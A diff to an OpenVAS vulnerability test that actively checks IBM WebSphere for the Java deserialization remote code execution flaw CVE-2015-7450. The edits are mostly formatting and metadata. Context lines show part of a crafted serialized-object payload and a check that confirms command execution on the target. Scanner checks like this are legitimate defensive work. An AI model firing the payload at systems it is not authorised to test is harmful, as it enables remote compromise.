@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_ibm_websphere_77653.nasl 12449 2018-11-21 07:50:18Z cfischer $
+# $Id: gb_ibm_websphere_77653.nasl 13803 2019-02-21 08:24:24Z cfischer $
 #
 # IBM WebSphere Application Server Remote Code Execution Vulnerability (Active Check)
 #
@@ -25,25 +25,25 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-CPE = 'cpe:/a:ibm:websphere_application_server';
+CPE = "cpe:/a:ibm:websphere_application_server";
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.105835");
   script_bugtraq_id(77653);
   script_cve_id("CVE-2015-7450");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_version("$Revision: 12449 $");
+  script_version("$Revision: 13803 $");
   script_name("IBM WebSphere Application Server Remote Code Execution Vulnerability (Active Check)");
-  script_tag(name:"last_modification", value:"$Date: 2018-11-21 08:50:18 +0100 (Wed, 21 Nov 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-02-21 09:24:24 +0100 (Thu, 21 Feb 2019) $");
   script_tag(name:"creation_date", value:"2016-07-29 15:54:10 +0200 (Fri, 29 Jul 2016)");
   script_category(ACT_ATTACK);
-  script_family("Web application abuses");
+  script_family("Web Servers");
   script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
   script_dependencies("gb_ibm_websphere_detect.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80, 8880);
-  script_exclude_keys("Settings/disable_cgi_scanning");
+  script_mandatory_keys("ibm_websphere_application_server/installed");
 
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/77653");
   script_xref(name:"URL", value:"https://www-01.ibm.com/support/docview.wss?uid=swg21970575");
@@ -75,10 +75,15 @@ include("misc_func.inc");
 include("host_details.inc");
 include("dump.inc");
 
-if( ! port = get_app_port( cpe:CPE, service:'www' ) ) exit( 0 );
+if( ! port = get_app_port( cpe:CPE, service:"www" ) )
+  exit( 0 );
+
+if( ! get_app_location( port:port, cpe:CPE ) )
+  exit( 0 );
 
 soc = open_sock_tcp( port );
-if( ! soc ) exit( 0 );
+if( ! soc )
+  exit( 0 );
 
 payload = raw_string(
 0xac,0xed,0x00,0x05,0x73,0x72,0x00,0x32,0x73,0x75,0x6e,0x2e,0x72,0x65,0x66,0x6c,
@@ -208,14 +213,12 @@ res = send_capture( socket:soc,
                     data:req,
                     timeout:2,
                     pcap_filter: string( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() ) );
-
 close( soc );
 
-if( res && ( win || check >< res ) )
-{
+if( res && ( win || check >< res ) ) {
   report = 'By sending a special crafted serialized java object it was possible to execute `' + cmd  + '` on the remote host\nReceived answer:\n\n' + hexdump( ddata:( res ) );
   security_message( port:port, data:report );
   exit( 0 );
 }
 
-exit( 0 );
+exit( 99 );
